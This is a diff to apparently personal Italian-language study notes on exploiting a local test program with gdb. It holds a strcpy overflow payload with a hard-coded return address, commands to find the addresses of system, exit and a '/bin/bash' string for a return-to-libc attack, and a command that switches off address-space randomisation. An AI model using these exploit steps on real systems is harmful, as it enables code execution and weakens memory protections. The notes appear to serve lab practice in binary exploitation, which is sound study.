@@ -1,6 +1,20 @@
 # per runnare da dentro gdb, trovare l'indirizzo della funzione e quando va in overflow la strcpy
 run $(perl -e 'print "A"x16,"\xb9\x61\x55\x56"')
 
+# comandi utili di gdb
+# disassembla il main
+disas main 
+# stampa il registro
+x/200xw $esp
+# stampa le funzioni
+info functions
+# indirizzo system (la system è molto grande, possiamo spostarci un po')
+p system
+# indirizzo exit
+p exit
+# stampa 550 caratteri di esp per vedere le variabili di ambiente
+x/500s $esp
+# trovato SHELL=/bin/bash dobbiamo andare 6 caratteri dopo per ottentere solo /bin/bash 
 
 # disabilitare la funzionalità di randomizzazione della memoria
 echo 0 > /proc/sys/kernel/randomize_va_space
